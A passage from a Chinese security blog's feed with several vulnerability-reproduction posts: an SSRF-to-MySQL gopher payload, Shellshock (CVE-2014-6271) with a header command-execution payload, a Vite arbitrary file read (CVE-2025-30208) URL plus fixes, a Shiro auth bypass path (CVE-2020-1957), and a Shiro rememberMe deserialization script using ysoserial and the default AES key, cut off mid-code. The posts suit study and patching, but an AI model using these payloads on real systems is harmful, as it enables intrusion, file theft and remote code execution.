class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure><p>拿到 MySQL 的插件目录为：<code>/usr/lib/mysql/plugin/</code></p><p><img src="/images/ssrf-vul-for-new/image-20250403092510843.png" alt="image-20250403092510843"></p><p>接下来利用思路</p><p>接着来写入动态链接库</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/Duoduo-chino/ssrf-vul-for-new/">Duoduo-chino&#x2F;ssrf-vul-for-new: ssrf-vul-for-new</a></p><p><a href="https://www.sqlsec.com/2021/05/ssrf.html#%E9%9D%B6%E5%9C%BA%E6%8B%93%E6%89%91%E8%AE%BE%E8%AE%A1">手把手带你用 SSRF 打穿内网 | 国光</a></p><p><a href="https://www.cnblogs.com/CoLo/p/14214208.html#%E6%8E%A2%E6%B5%8B%E6%BC%8F%E6%B4%9E">SSRF之利用dict和gopher吊打Redis - Zh1z3ven - 博客园</a></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssrf使用教学</tag>
      
      <tag>ssrf打穿内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellshock-CVE-2014-6271</title>
    <link href="/2025/04/02/Shellshock-CVE-2014-6271/"/>
    <url>/2025/04/02/Shellshock-CVE-2014-6271/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h2><p>该漏洞在Red Hat、CentOS、Ubuntu 、Fedora 、Amazon Linux 、OS X 10.10中均拥有存在CVE-2014-6271（即“破壳”漏洞）漏洞的Bash版本，同时由于Bash在各主流操作系统的广泛应用，此漏洞的影响范围包括但不限于大多数应用Bash的Unix、Linux、Mac OS X，而针对这些操作系统管理下的数据均存在高危威胁。</p><h2 id="漏洞具体成因"><a href="#漏洞具体成因" class="headerlink" title="漏洞具体成因"></a>漏洞具体成因</h2><p>1）Linux Web Server 一般可以提供CGI接口，允许远程执行Bash命令</p><p>2）对于 http 头部，CGI 脚本解析器会将其当作环境变量，调用Bash的env相关函数设置到临时环境变量中</p><p>3）Http 允许发送任意客户端自定义的 HTTP头部</p><p>大家此时有没有想法？</p><p>小白 : 包的呀！</p><p>大神 ：access getshell</p><p>是的，我们可以构造好带攻击命令的HTTP头部到服务器，服务器调用设置环境变量的函数，直接执行了客户端指定头部里面的命令</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>我们使用两个版本进行对比</p><p>一个是Bash4.3 生成的页面，一个是修复版的Bash生成的页面</p><h3 id="victim-cgi"><a href="#victim-cgi" class="headerlink" title="victim.cgi"></a>victim.cgi</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/local/bash-4.3.0/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Content-type: text/html&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;title&gt;Bash ShellShock&lt;/title&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Hello world&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/html&gt;&#x27;</span><br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure><h3 id="safe-cgi"><a href="#safe-cgi" class="headerlink" title="safe.cgi"></a>safe.cgi</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Content-type: text/html&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;title&gt;Bash ShellShock&lt;/title&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Hello world&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/html&gt;&#x27;</span><br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">() &#123; foo; &#125;; <span class="hljs-built_in">echo</span> Content-Type: text/plain; <span class="hljs-built_in">echo</span>; /usr/bin/whoami<br></code></pre></td></tr></table></figure><p>解释一下</p><ol><li><code>() &#123; foo; &#125;;</code>：这定义了一个匿名函数，函数体仅包含对 <code>foo</code> 命令的调用。不过，代码里并未对 <code>foo</code> 命令进行定义，所以在执行时会报错。</li><li><code>echo Content-Type: text/plain;</code>：此命令会向标准输出打印 <code>Content-Type: text/plain</code>。在 HTTP 响应里，<code>Content-Type</code> 一般用于表明响应内容的类型。</li><li><code>echo;</code>：该命令会输出一个空行，在 HTTP 响应里，空行用于分隔响应头和响应体。</li><li><code>/usr/bin/whoami</code>：这个命令会输出当前用户的用户名</li></ol><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>victim.cgi</p><p>你没看错执行了！</p><p><img src="/images/Shellshock-CVE-2014-6271/image-20250402114915300.png" alt="image-20250402114915300"></p><p>safe.cgi</p><p>没有把攻击命令当作变量执行了</p><p><img src="/images/Shellshock-CVE-2014-6271/image-20250402114708372.png" alt="image-20250402114708372"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>Shellshock</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vite CVE-2025-30208</title>
    <link href="/2025/03/28/Vite-CVE-2025-30208/"/>
    <url>/2025/03/28/Vite-CVE-2025-30208/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>3 月 24 日，漏洞发现者在 GitHub 安全公告中披露了 Vite 存在的任意文件读取漏洞（漏洞编号：CVE-2025-30208，漏洞级别：高危），该漏洞源于Vite在其开发服务器模式下，提供了<code>@fs</code>机制，用于访问服务允许范围内的文件。对特定 URL 请求的路径校验不严格，导致可以通过在URL请求中添加特定参数（如<code>?raw??</code>或<code>?import&amp;raw??</code>），绕过原有用于阻止越权访问的server.fs.deny访问限制，从而可能读取服务器上的任意文件，包括项目源码、敏感配置文件等，导致严重的数据泄露风险。</p><h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> &lt;= version &lt;=<span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">2</span><br><br><span class="hljs-attribute">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span> &lt;= version &lt;=<span class="hljs-number">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> &lt;= version &lt;=<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">11</span><br><br><span class="hljs-attribute">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> &lt;= version &lt;=<span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">14</span><br><br><span class="hljs-attribute">version</span> &lt;=<span class="hljs-number">4</span>.<span class="hljs-number">5</span>.<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Vite</span> &gt;= <span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">1</span>.<span class="hljs-number">2</span> &lt;= Vite &lt; <span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">0</span>.<span class="hljs-number">12</span> &lt;= Vite &lt; <span class="hljs-number">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">4</span>.<span class="hljs-number">15</span> &lt;= Vite &lt; <span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">5</span>.<span class="hljs-number">10</span> &lt;= Vite &lt; <span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="修复指南"><a href="#修复指南" class="headerlink" title="修复指南"></a>修复指南</h3><p>1.优先升级到官方修复版本</p><p>2.确认当前Vite版本</p><p>项目下使用命令，或者直接查看package.json找到版本号</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> list vite<br></code></pre></td></tr></table></figure><p>3.升级Vite</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">npm</span> install vite@<span class="hljs-number">4</span>.<span class="hljs-number">5</span>.<span class="hljs-number">10</span> # 若之前使用的是 <span class="hljs-number">4</span>.x 版本<br><span class="hljs-attribute">npm</span> install vite@<span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">15</span> # 若之前使用的是 <span class="hljs-number">5</span>.x 版本<br><span class="hljs-attribute">npm</span> install vite@<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span> # 若之前使用的是 <span class="hljs-number">6</span>.<span class="hljs-number">0</span>.x 版本<br><span class="hljs-attribute">npm</span> install vite@<span class="hljs-number">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> # 若之前使用的是 <span class="hljs-number">6</span>.<span class="hljs-number">1</span>.x 版本<br><span class="hljs-attribute">npm</span> install vite@<span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">3</span> # 若之前使用的是 <span class="hljs-number">6</span>.<span class="hljs-number">2</span>.x 版本<br></code></pre></td></tr></table></figure><p>4.再次验证保证Vite对于此漏洞修复</p><h3 id="临时修复"><a href="#临时修复" class="headerlink" title="临时修复"></a>临时修复</h3><p>1.移除 <code>--host</code> 参数</p><p>如果你在启动开发服务器时使用了 <code>--host</code> 参数，将其移除。例如，将启动命令从：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">npx</span> vite --host <span class="hljs-number">0.0.0.0</span><br></code></pre></td></tr></table></figure><p>改为：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">npx vite</span><br></code></pre></td></tr></table></figure><p>2.配置 <code>server.host</code></p><p>若在 <code>vite.config.js</code> 或 <code>vite.config.ts</code> 中配置了 <code>server.host</code>，将其注释或修改为仅允许本地访问。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.安装Vite环境</p><p>创建一个项目文件夹，使用CMD</p><p>执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">npm <span class="hljs-keyword">create</span> vite<span class="hljs-variable">@latest</span> test <span class="hljs-operator">-</span>y <span class="hljs-comment">-- --template vue-ts</span><br></code></pre></td></tr></table></figure><p><img src="/images/Vite-CVE-2025-30208/image-20250328084938374.png" alt="image-20250328084938374"></p><p>会得到<code>&quot;vite&quot;: &quot;^6.2.0&quot;</code>，这里的<code>^</code>符号表示安装兼容的最新版本，它允许安装的版本在不改变主版本号的前提下，更新次版本号和补丁版本号。所以如果急着直接执行<code>npm install</code>，所安装的Vite版本会是不受影响的<code>6.2.3</code>。（其他受影响版本同理）。</p><p><strong>这也是官方在依赖管理层面提供的一种便捷修补方式。</strong></p><p>所以这里要进来修改package.json，把 ‘^’ 去掉</p><p>把它搞成受攻击的版本6.2.0</p><p><img src="/images/Vite-CVE-2025-30208/image-20250328085224706.png" alt="image-20250328085224706"></p><p><img src="/images/Vite-CVE-2025-30208/image-20250328085553859.png" alt="image-20250328085553859"></p><p><a href="http://localhost:5173/@fs/C://windows/win.ini?import&raw??">localhost:5173&#x2F;@fs&#x2F;C:&#x2F;&#x2F;windows&#x2F;win.ini?import&amp;raw??</a></p><p><img src="/images/Vite-CVE-2025-30208/image-20250328090245447.png" alt="image-20250328090245447"></p><h3 id="执行修复命令"><a href="#执行修复命令" class="headerlink" title="执行修复命令"></a>执行修复命令</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">npm</span> install vite@<span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>修复后：<img src="/images/Vite-CVE-2025-30208/image-20250328094258812.png" alt="image-20250328094258812"></p><p>参考文章</p><p><a href="https://blog.csdn.net/misu6/article/details/146573012">Vite 任意文件读取漏洞分析复现 CVE-2025-30208-CSDN博客</a></p><p><a href="https://mp.weixin.qq.com/s/BsjllB8_K9gh4u1QfkMTsw">Vite任意文件读取漏洞复现（CVE-2025-30208）</a></p><p><a href="https://www.panziye.com/front/16376.html">Vite存在CVE-2025-30208安全漏洞（附修复方案和演示示例） _ 潘子夜个人博客</a></p><p><a href="https://blog.csdn.net/misu6/article/details/146573012">Vite 任意文件读取漏洞分析复现 CVE-2025-30208-CSDN博客</a></p><p><a href="https://www.xaitx.com/tech/2025-03-26.html">Vite 任意文件读取漏洞分析复现（CVE-2025-30208） | 小艾博客</a></p><p><a href="https://www.ctfiot.com/233845.html">复现与修复指南：Vite任意文件读取漏洞（CVE-2025-30208） | CTF导航</a></p><p><a href="https://blog.nsfocus.net/cve-2025-30208/">Vite任意文件读取漏洞 (CVE-2025-30208) – 绿盟科技技术博客</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vite</tag>
      
      <tag>文件读取</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro认证绕过CVE-2020-1957</title>
    <link href="/2025/03/26/Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87CVE-2020-1957/"/>
    <url>/2025/03/26/Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87CVE-2020-1957/</url>
    
    <content type="html"><![CDATA[<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="Shiro拦截器"><a href="#Shiro拦截器" class="headerlink" title="Shiro拦截器"></a>Shiro拦截器</h3><p>Shiro框架通过拦截器功能来实现对用户访问权限的控制和拦截。Shiro中常见的拦截器有anon,authc等拦截器。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1.anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口<br><br>2.authc为登录拦截器，需要登录认证才能访问的资源。<br></code></pre></td></tr></table></figure><p>用户可以在Shiro.ini编写匹配URL配置，将会拦截匹配的URL，并执行响应的拦截器。从而实现对URL的访问控制，URL路径表达式通常为ANT格式。如下配置，访问 &#x2F;index.html主页的时候，Shiro将不会对其进行登录判断，anon拦截器不需要登录就能进行访问。而对于&#x2F;user&#x2F;xiaoming 等 &#x2F;user&#x2F;xiaogang等接口，authc拦截器将会对其进行登录判断，有登录认证才能访问资源。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">[urls]<br>/index.html <span class="hljs-operator">=</span> anon<br>/user/** <span class="hljs-operator">=</span> authc<br></code></pre></td></tr></table></figure><p>Shiro的URL路径表达式为Ant 格式，路径通配符支持?***</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">?：匹配一个字符<br><span class="hljs-comment">*：匹配零个或多个字符串</span><br><span class="hljs-comment">**：匹配路径中的零个或多个路径</span><br></code></pre></td></tr></table></figure><p>这里粗略解释一下，当路径为&#x2F;xxx&#x2F;..和拦截规则里的&#x2F;xxx&#x2F;**匹配成功，通过校验，成功转向后方的Spring Boot . 从而进行了绕过</p><p>其中*表示匹配零个或多个字符串，&#x2F;<em>可以匹配&#x2F;hello，但匹配不到&#x2F;hello&#x2F;因为</em>通配符无法匹配路径。假设&#x2F;hello接口设置了authc拦截器，访问&#x2F;hello将会被进行权限判断，如果请求的URI为&#x2F;hello&#x2F;呢，&#x2F;*URL路径表达式将无法正确匹配，放行。然后进入到spring(Servlet)拦截器，spring中&#x2F;hello形式和&#x2F;hello&#x2F;形式的URL访问的资源是一样的。</p><h2 id="本实验环境-使用docker完成复现，公网"><a href="#本实验环境-使用docker完成复现，公网" class="headerlink" title="本实验环境 使用docker完成复现，公网"></a>本实验环境 使用docker完成复现，公网</h2><p>这个应用中对URL权限的配置如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> ShiroFilterChainDefinition <span class="hljs-title function_">shiroFilterChainDefinition</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">DefaultShiroFilterChainDefinition</span> <span class="hljs-variable">chainDefinition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultShiroFilterChainDefinition</span>();<br>    chainDefinition.addPathDefinition(<span class="hljs-string">&quot;/login.html&quot;</span>, <span class="hljs-string">&quot;authc&quot;</span>); <span class="hljs-comment">// need to accept POSTs from the login form</span><br>    chainDefinition.addPathDefinition(<span class="hljs-string">&quot;/logout&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>);<br>    chainDefinition.addPathDefinition(<span class="hljs-string">&quot;/admin/**&quot;</span>, <span class="hljs-string">&quot;authc&quot;</span>);<br>    <span class="hljs-keyword">return</span> chainDefinition;<br>&#125;<br></code></pre></td></tr></table></figure><p>1.访问环境8080端口</p><p><img src="/images/Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87CVE-2020-1957/image-20250326154808543.png" alt="image-20250326154808543"></p><p>2.当访问地址&#x2F;admin&#x2F;会被重定向到login.php</p><p><img src="/images/Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87CVE-2020-1957/image-20250326154940212.png" alt="image-20250326154940212"></p><p><img src="/images/Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87CVE-2020-1957/image-20250326155227524.png" alt="image-20250326155227524"></p><p>3.构造恶意请求&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F; ，绕过权限校验，到达管理员界面</p><p><img src="/images/Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87CVE-2020-1957/image-20250326155755134.png" alt="image-20250326155755134"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aR139">https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aR139</a></p><p>升级1.5.2版本及以上</p><p>修改了requestURI的获取方式，经过更准确的解析获取</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/vuls/231909.html">https://www.freebuf.com/vuls/231909.html</a></p><p><a href="https://xz.aliyun.com/news/7876?time__1311=Yqjx0DuDgiuDlOzG7DyDAOAWuboToD&u_atoken=0428e47a997e4a01d1ccb7c1af771093&u_asig=0a47314717429912626914864e0099">https://xz.aliyun.com/news/7876?time__1311=Yqjx0DuDgiuDlOzG7DyDAOAWuboToD&amp;u_atoken=0428e47a997e4a01d1ccb7c1af771093&amp;u_asig=0a47314717429912626914864e0099</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shiro</tag>
      
      <tag>拦截器绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro-CVE-2016-4437</title>
    <link href="/2025/03/25/Shiro-%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2CVE-2016-4437/"/>
    <url>/2025/03/25/Shiro-%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2CVE-2016-4437/</url>
    
    <content type="html"><![CDATA[<h3 id="Shiro-CVE-2016-4437"><a href="#Shiro-CVE-2016-4437" class="headerlink" title="Shiro-CVE-2016-4437"></a>Shiro-CVE-2016-4437</h3><p>1.目标加入随意字符提交后 bp中带有：Set-Cookie: rememberMe&#x3D;deleteMe字段<img src="/images/Shiro-CVE-2016-4437/image-20250306101153831.png" alt="image-20250306101153831"></p><p>2.ysoserial 生成</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial-all.<span class="hljs-keyword">jar </span>CommonsBeanutils1 <span class="hljs-string">&quot;touch /desktop&quot;</span> &gt; poc.ser<br></code></pre></td></tr></table></figure><p>生成payload的py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>():<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;poc.ser&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(key, AES.MODE_CBC, iv)<br>    file_body = pad(f.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme()   <br>    <span class="hljs-built_in">print</span>(<span 